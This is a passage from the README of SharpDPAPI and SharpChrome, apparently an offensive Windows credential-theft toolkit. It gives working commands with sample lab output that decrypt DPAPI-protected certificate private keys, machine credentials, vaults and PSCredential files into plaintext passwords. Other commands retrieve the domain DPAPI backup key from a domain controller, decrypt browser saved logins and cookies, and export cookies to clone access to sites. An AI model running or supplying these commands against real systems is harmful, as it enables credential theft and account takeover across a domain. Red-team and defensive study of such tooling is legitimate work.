A specific certificate can be specified with `/target:FILE` or `/target:C:\Folder\`. In both cases, {GUID}:SHA1 values (or `/unprotect`) are required or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.

By default, only private keys linkable to an associated installed certificate are displayed. The `/showall` command will display ALL decrypted private keys.

Use the `/cng` flag for CNG private keys (default is capi).

Using domain {GUID}:SHA1 masterkey mappings:

    C:\Temp> SharpDPAPI.exe certificates {dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB513717AA...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.10.0


    [*] Action: Certificate Triage

    Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104

      File               : 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0

        Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
        Master Key GUID  : {dab90445-0a08-4b27-9110-b75d4a7894d0}
        Description      : CryptoAPI Private Key
        algCrypt         : CALG_3DES (keyLen 192)
        algHash          : CALG_SHA (32772)
        Salt             : ef98458bca7135fe1bb89b3715180ae6
        HMAC             : 5c3c3da2a4f6548a0186c22f86d7bc85
        Unique Name      : te-UserMod-8c8e0236-76ca-4a36-b4d5-24eaf3c3e1da

        Thumbprint       : 98A03BC583861DCC19045758C0E0C05162091B6C
        Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
        Subject          : CN=harmj0y
        Valid Date       : 2/22/2021 2:19:02 PM
        Expiry Date      : 2/22/2022 2:19:02 PM
        Enhanced Key Usages:
            Client Authentication (1.3.6.1.5.5.7.3.2)
             [!] Certificate is used for client auth!
            Secure Email (1.3.6.1.5.5.7.3.4)
            Encrypting File System (1.3.6.1.4.1.311.10.3.4)

        [*] Private key file 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA0WDgv/jH5HuATtPgQSBie5t...(snip)...
    -----END RSA PRIVATE KEY-----
    -----BEGIN CERTIFICATE-----
    MIIFujCCBKKgAwIBAgITVQAAAJf6yKyhm5SBVwA...(snip)...
    -----END CERTIFICATE-----

Using `/unprotect` to decrypt any found user certificates:

    C:\Temp> SharpDPAPI.exe certificates /unprotect

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.11.3


    [*] Action: Certificate Triage

    [*] Using CryptUnprotectData() for decryption.


    Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104

      File               : f29fa2bb6de62b7d966a407ef203ac45_3fef0615-487e-485b-84b0-193b510dec3b

        Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
        Master Key GUID  : {27db0044-e2aa-4ea2-b2c0-c469e9b29ed9}
        Description      : Private Key
        algCrypt         : CALG_AES_256 (keyLen 256)
        algHash          : CALG_SHA_512 (32782)
        Salt             : d7e1e00ed8a6249b5f05c487154e83cc0b51f71131530d0d46d3bfc63d890468
        HMAC             : 4869f296cdcc964262a57e2efc4f2c5df57c2ed7319e297daa2107810da5c171
        Unique Name      : {4A07001C-57BE-4E8B-86D1-43CACDF8D448}

        Thumbprint       : BBD9B90FE1A4E37BD646CBC922ABE06C24C1E725
        Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
        Subject          : CN=harmj0y
        Valid Date       : 10/18/2022 11:40:07 AM
        Expiry Date      : 10/18/2023 12:00:07 PM
        Enhanced Key Usages:
            Client Authentication (1.3.6.1.5.5.7.3.2)
             [!] Certificate is used for client auth!
            Server Authentication (1.3.6.1.5.5.7.3.1)

        [*] Private key file f29fa2bb6de62b7d966a407ef203ac45_3fef0615-487e-485b-84b0-193b510dec3b was recovered:

    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAxVEW49fMt...(snip)...
    -----END RSA PRIVATE KEY-----
    -----BEGIN CERTIFICATE-----
    MIIDKjCCAhKgAwIBAgIQYwhUr...(snip)...
    -----END CERTIFICATE-----

Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:

    C:\Temp>SharpDPAPI.exe certificates /pvk:HvG1sAAAAAABAAAAAAAAAAAAAACU...(snip)...
      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.10.0


    [*] Action: Certificate Triage
    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!


    [*] User master key cache:

    {dab90445-0a08-4b27-9110-b75d4a7894d0}:C23AF7432EB51371...(snip)...



    Folder       : C:\Users\harmj0y\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-937929760-3187473010-80948926-1104

      File               : 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0

        Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
        Master Key GUID  : {dab90445-0a08-4b27-9110-b75d4a7894d0}
        Description      : CryptoAPI Private Key
        algCrypt         : CALG_3DES (keyLen 192)
        algHash          : CALG_SHA (32772)
        Salt             : ef98458bca7135fe1bb89b3715180ae6
        HMAC             : 5c3c3da2a4f6548a0186c22f86d7bc85
        Unique Name      : te-UserMod-8c8e0236-76ca-4a36-b4d5-24eaf3c3e1da

        Thumbprint       : 98A03BC583861DCC19045758C0E0C05162091B6C
        Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
        Subject          : CN=harmj0y
        Valid Date       : 2/22/2021 2:19:02 PM
        Expiry Date      : 2/22/2022 2:19:02 PM
        Enhanced Key Usages:
            Client Authentication (1.3.6.1.5.5.7.3.2)
             [!] Certificate is used for client auth!
            Secure Email (1.3.6.1.5.5.7.3.4)
            Encrypting File System (1.3.6.1.4.1.311.10.3.4)

        [*] Private key file 34eaff3ec61d0f012ce1a0cb4c10c053_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA0WDgv/jH5HuATtPgQSBie5t...(snip)...
    -----END RSA PRIVATE KEY-----
    -----BEGIN CERTIFICATE-----
    MIIFujCCBKKgAwIBAgITVQAAAJf6yKyhm5SBVwA...(snip)...
    -----END CERTIFICATE-----


#### triage

The **triage** command runs the user [credentials](#credentials), [vaults](#vaults), [rdg](#rdg), and [certificates](#certificates) commands.


### Machine Triage

#### machinemasterkeys

The **machinemasterkeys** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.

Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).

    C:\Temp>SharpDPAPI.exe machinemasterkeys

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: Machine DPAPI Masterkey File Triage

    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
    [*] RevertToSelf()

    [*] Secret  : DPAPI_SYSTEM
    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3


    [*] SYSTEM master key cache:

    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
    ...(snip)...



#### machinecredentials

The **machinecredentials** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Credential files.

Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).

    C:\Temp>SharpDPAPI.exe machinecredentials

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: Machine DPAPI Credential Triage

    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
    [*] RevertToSelf()

    [*] Secret  : DPAPI_SYSTEM
    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3

    [*] SYSTEM master key cache:

    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
    ...(snip)...


    [*] Triaging System Credentials


    Folder       : C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

      CredFile           : C73A55F92FAE222C18A8989FEA28A1FE

        guidMasterKey    : {1cb83cb5-96cd-445d-baac-49e97f4eeb72}
        size             : 544
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32782/26128
        description      : Local Credential Data

        LastWritten      : 3/24/2019 7:08:43 PM
        TargetName       : Domain:batch=TaskScheduler:Task:{B745BF75-D62D-4B1C-84ED-F0437214ECED}
        TargetAlias      :
        Comment          :
        UserName         : TESTLAB\harmj0y
        Credential       : Password123!


    Folder       : C:\WINDOWS\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials

      CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

        ...(snip)...


#### machinevaults

The **machinevaults** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Vaults.

Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).

    C:\Temp>SharpDPAPI.exe machinevaults

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: Machine DPAPI Vault Triage

    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
    [*] RevertToSelf()

    [*] Secret  : DPAPI_SYSTEM
    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3

    [*] SYSTEM master key cache:

    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
    ...(snip)...


    [*] Triaging SYSTEM Vaults


    [*] Triaging Vault folder: C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
      Name               : Web Credentials
        guidMasterKey    : {0bd732d9-c396-4f9a-a69a-508632c05235}
        size             : 324
        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
        algHash/algCrypt : 32782/26128
        description      :
        aes128 key       : 74CE3D7BCC4D0C4734931041F6D00D09
        aes256 key       : B497F57730A2F29C3533B76BD6B33EEA231C1F51ED933E0CA1210B9E3A16D081

    ...(snip)...


#### certificates /machine

The **certificates /machine** command will use the machine certificate store to look for decryptable machine certificate private keys. `/mkfile:X` and `{GUID}:masterkey` are usable with the `/target:\[file|folder\]` command, otherwise SharpDPAPI will elevate to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine system encrypted DPAPI private certificate keys.

By default, only private keys linkable to an associated installed certificate are displayed. The `/showall` command will display ALL decrypted private keys.

Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).

    C:\Temp>SharpDPAPI.exe certificates /machine

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.10.0


    [*] Action: Certificate Triage
    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
    [*] RevertToSelf()

    [*] Secret  : DPAPI_SYSTEM
    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3


    [*] SYSTEM master key cache:

    {f12f57e1-dd41-4daa-88f1-37a64034c7e9}:3AEB121ECF2...(snip)...


    [*] Triaging System Certificates


    Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys

      File               : 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0

        Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
        Master Key GUID  : {f12f57e1-dd41-4daa-88f1-37a64034c7e9}
        Description      : CryptoAPI Private Key
        algCrypt         : CALG_3DES (keyLen 192)
        algHash          : CALG_SHA (32772)
        Salt             : aa8c9e4849455660fc5fc96589f3e40e
        HMAC             : 9138559ef30fbd70808dca2c1ed02a29
        Unique Name      : te-Machine-50500b00-fddb-4a0d-8aa6-d73404473650

        Thumbprint       : A82ED8207DF6BC16BB65BF6A91E582263E217A4A
        Issuer           : CN=theshire-DC-CA, DC=theshire, DC=local
        Subject          : CN=dev.theshire.local
        Valid Date       : 2/22/2021 3:50:43 PM
        Expiry Date      : 2/22/2022 3:50:43 PM
        Enhanced Key Usages:
            Client Authentication (1.3.6.1.5.5.7.3.2)
             [!] Certificate is used for client auth!
            Server Authentication (1.3.6.1.5.5.7.3.1)

        [*] Private key file 9377cea385fa1e5bf7815ee2024d0eea_6c712ef3-1467-4f96-bb5c-6737ba66cfb0 was recovered:

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAzRX2ipgM1t9Et4KoP...(snip)...
    -----END RSA PRIVATE KEY-----
    -----BEGIN CERTIFICATE-----
    MIIFOjCCBCKgAwIBAgITVQAAAJqDK8j15...(snip)...
    -----END CERTIFICATE-----


#### machinetriage

The **machinetriage** command runs the user [machinecredentials](#machinecredentials), [machinevaults](#machinevaults), and [certificates /machine](#certificates--machine) commands.


### Misc

#### ps

The **ps** command will describe/decrypt an exported PSCredential clixml. A `/target:FILE.xml` *must* be supplied.

The command will a) decrypt the file with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

The `/unprotect` flag will use CryptUnprotectData() to decrypt the credenial .xml without masterkeys needed, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).

Decrypt an exported credential .xml using CryptProtectData() (the `/unprotect` flag):

    PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    PS C:\Temp> New-Object System.Management.Automation.PSCredential('TESTLAB\user', $SecPassword) | Export-CLIXml C:\Temp\cred.xml
    PS C:\Temp> .\SharpDPAPI.exe ps /target:C:\Temp\cred.xml /unprotect

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.5.0


    [*] Action: Describe PSCredential .xml

        CredFile         : C:\Temp\cred.xml
        Accessed         : 7/25/2019 11:53:09 AM
        Modified         : 7/25/2019 11:53:09 AM
        User Name        : TESTLAB\user
        guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
        size             : 170
        flags            : 0x0
        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
        description      :
        Password         : Password123!


Using domain {GUID}:SHA1 masterkey mappings:

    PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    PS C:\Temp> New-Object System.Management.Automation.PSCredential('TESTLAB\user', $SecPassword) | Export-CLIXml C:\Temp\cred.xml
    PS C:\Temp> .\SharpDPAPI.exe ps /target:C:\Temp\cred.xml "{0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3"

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.5.0


    [*] Action: Describe PSCredential .xml

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] User master key cache:

    {0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3

        CredFile         : C:\Temp\cred.xml
        Accessed         : 7/25/2019 12:04:12 PM
        Modified         : 7/25/2019 12:04:12 PM
        User Name        : TESTLAB\user
        guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
        size             : 170
        flags            : 0x0
        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
        description      :
        Password         : Password123!


Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:

    PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    PS C:\Temp> New-Object System.Management.Automation.PSCredential('TESTLAB\user', $SecPassword) | Export-CLIXml C:\Temp\cred.xml
    PS C:\Temp> .\SharpDPAPI.exe ps /target:C:\Temp\cred.xml /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.5.0


    [*] Action: Describe PSCredential .xml

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] User master key cache:

    {0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3

        CredFile         : C:\Temp\cred.xml
        Accessed         : 7/25/2019 12:04:12 PM
        Modified         : 7/25/2019 12:04:12 PM
        User Name        : TESTLAB\user
        guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
        size             : 170
        flags            : 0x0
        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
        description      :
        Password         : Password123!


#### blob

The **blob** command will describe/decrypt a DPAPI blob. A `/target:<BASE64|blob.bin>` *must* be supplied.

The command will a) decrypt the blob with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

The `/unprotect` flag will use CryptUnprotectData() to decrypt the blob without masterkeys needed, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).

Decrypt a blob using CryptProtectData() (the `/unprotect` flag):

C:\Temp>SharpDPAPI.exe blob /target:C:\Temp\blob.bin /unprotect

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.5.0


    [*] Action: Describe DPAPI blob

    [*] Using CryptUnprotectData() for decryption.

        guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
        size             : 170
        flags            : 0x0
        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
        description      :
        dec(blob)        : Password123!


Using domain {GUID}:SHA1 masterkey mappings:

    C:\Temp>SharpDPAPI.exe blob /target:C:\Temp\blob2.bin {0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.5.0


    [*] Action: Describe DPAPI blob

    [*] Using CryptUnprotectData() for decryption.

        guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
        size             : 314
        flags            : 0x0
        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
        description      :
        dec(blob)        : 01 00 00 00 3F 3F 3F 3F 01 15 3F 11 3F 7A 00 3F 4F 3F 3F ...


Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:

    C:\Temp>SharpDPAPI.exe blob /target:C:\Temp\blob2.bin /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.5.0


    [*] Action: Describe DPAPI blob

    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

    [*] User master key cache:

    {0241bc33-44ae-404a-b05d-a35eea8cbc63}:E7E481877B9D51C17E015EB3C1F72FB887363EE3

        guidMasterKey    : {0241bc33-44ae-404a-b05d-a35eea8cbc63}
        size             : 314
        flags            : 0x0
        algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
        description      :
        dec(blob)        : 01 00 00 00 3F 3F 3F 3F 01 15 3F 11 3F 7A 00 3F 4F 3F 3F ...


#### backupkey

The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using the **LsaRetrievePrivateData** API approach [from Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927). This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)

Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.

The `/nowrap` flag will prevent wrapping the base64 key on display.

This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk** module, or used in blob/file /pvk:X form with the **masterkeys**, **credentials**, or **vault** SharpDPAPI commands.

By default, SharpDPAPI will try to determine the current domain controller via the **DsGetDcName** API call. A server can be specified with `/server:COMPUTER.domain.com`. If you want the key saved to disk instead of output as a base64 blob, use `/file:key.pvk`.

Retrieve the DPAPI backup key for the current domain controller:

    C:\Temp>SharpDPAPI.exe backupkey

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: Retrieve domain DPAPI backup key


    [*] Using current domain controller  : PRIMARY.testlab.local
    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Key :
              HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAA...(snip)...


Retrieve the DPAPI backup key for the specified DC, outputting the backup key to a file:

    C:\Temp>SharpDPAPI.exe backupkey /server:primary.testlab.local /file:key.pvk

      __                 _   _       _ ___
     (_  |_   _. ._ ._  | \ |_) /\  |_) |
     __) | | (_| |  |_) |_/ |  /--\ |  _|_
                    |
      v1.2.0


    [*] Action: Retrieve domain DPAPI backup key


    [*] Using server                     : primary.testlab.local
    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
    [*] Backup key written to            : key.pvk


#### search
The **search** command will search for potential DPAPI blobs in the registry, files, folders, and base64 blobs. Usage:
```
SharpDPAPI.exe search /type:registry [/path:HKLM\path\to\key] [/showErrors]
SharpDPAPI.exe search /type:folder /path:C:\path\to\folder [/maxBytes:<numOfBytes>] [/showErrors]
SharpDPAPI.exe search /type:file /path:C:\path\to\file [/maxBytes:<numOfBytes>]
SharpDPAPI.exe search /type:base64 [/base:<base64 string>]
```
The `search` command works by searching for the following bytes, which represent the header (Version + DPAPI provider GUID) of DPAPI blob structure:

```
0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01, 0x15, 0xD1, 0x11, 0x8C, 0x7A, 0x00, 0xC0, 0x4F, 0xC2, 0x97, 0xEB
```

The search command has different arguments depending on the data type being scanned. To designate the data type, use the `/type` argument specifying `registry`, `folder`, `file`, or `base64`. If the `/type` argument is not present, the command will search the registry by default. 

When searching the registry with no other arguments, the command will recursively search the HKEY_LOCAL_MACHINE and HKEY_USERS hives. Use `/path` parameter to specify a root to key to search from (e.g. `/path:HKLM\Software`) and use the `/showErrors` argument to display errors that occuring during enumeration.

When searching a file or folder, specify a path with `/path:C:\Path\to\file\or\folder` and optionally use `/maxBytes:<int>` to specify the number of bytes to read from each file (default: 1024 bytes). The command will read the bytes from the beginning of the file and search for DPAPI blobs. Use `/showErrors` to display an errors that occur during enumeration.

When searching a base64 blob, specify the base64-encoded bytes to scan with the `/base64:<base64 str>` parameter.

#### SCCM
If elevated on a machine that is an SCCM client, if the SCCM environment is configured with a Network Access Account (NAA), the system master key-protected DPAPI blobs containing the NAA credentials can be retrieved via WMI; The **SCCM** command will query the blobs via WMI, retrieve the system master keys, and decrypt the blobs.

## SharpChrome Commands

### logins

The **logins** command will search for Chrome 'Login Data' files and decrypt the saved login passwords. If execution is in an unelevated contect, CryptProtectData() will automatically be used to try to decrypt values. If `/browser:edge` is specified, the newer Chromium-based Edge browser is triaged.

Login Data files can also be decrypted with a) any "{GUID}:SHA1 {GUID}:SHA1 ..." masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys, or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

A specific Login Data file can be specified with `/target:FILE`. A remote `/server:SERVER` can be specified if a `/pvk` or `/password` is also supplied. If triaging newer Chrome/Edge instances, a `/statekey:X` AES state key can be specified.

By default, logins are displayed in a csv format. This can be modified with `/format:table` for table output. Also, by default only non-null password value entries are displayed, but all values can be displayed with `/showall`.

If run from an elevated context, Login Data files for ALL users will be triaged, otherwise only Login Data files for the current user will be processed.

### cookies

The **cookies** command will search for Chromium 'Cookies' files and decrypt cookie values. If execution is in an unelevated contect, CryptProtectData() will automatically be used to try to decrypt values. You can change the target application using the `/browser:<VALUE>` (e.g., edge, brave, slack).

Cookie files can also be decrypted with a) any "{GUID}:SHA1 {GUID}:SHA1 ..." masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys, or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

A specific Cookies file can be specified with `/target:FILE`. A remote `/server:SERVER` can be specified if a `/pvk` or `/password` is also supplied. If triaging newer Chrome/Edge instances, a `/statekey:X` AES state key can be specified.

By default, cookies are displayed in a csv format. This can be modified with `/format:table` for table output, or `/format:json` for output importable by [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en). Also, by default only non-expired cookie value entries are displayed, but all values can be displayed with `/showall`.

If run from an elevated context, Cookie files for ALL users will be triaged, otherwise only Cookie files for the current user will be processed.

The **cookies** command also has `/cookie:REGEX` and `/url:REGEX` arguments to only return cookie names or urls matching the supplied regex. This is useful with `/format:json` to easily clone access to specific sites.

### statekeys

By default, the **statekeys** command will search for Chromium-based applications (Google Chrome, Edge, Brave, and Slack), locate their AES statekey files (e.g., 'AppData\Local\Google\Chrome\User Data\Local State' and 'AppData\Local\Microsoft\Edge\User Data\Local State'), and decrypt them using the same type of arguments that can be supplied for `cookies` and `logins`. You may also supply the path to a specific state-key file using the `/target:` parameter (e.g., `"/target:C:\Users\Test\appdata\Local\Google\Chrome\User Data\Local State"`).

State keys can also be decrypted with a) any "{GUID}:SHA1 {GUID}:SHA1 ..." masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, c) a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys, or d) a `/password:X` to decrypt any user masterkeys, which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.

If run from an elevated context, state keys for ALL users will be triaged, otherwise only state keys for the current user will be processed.

### backupkey

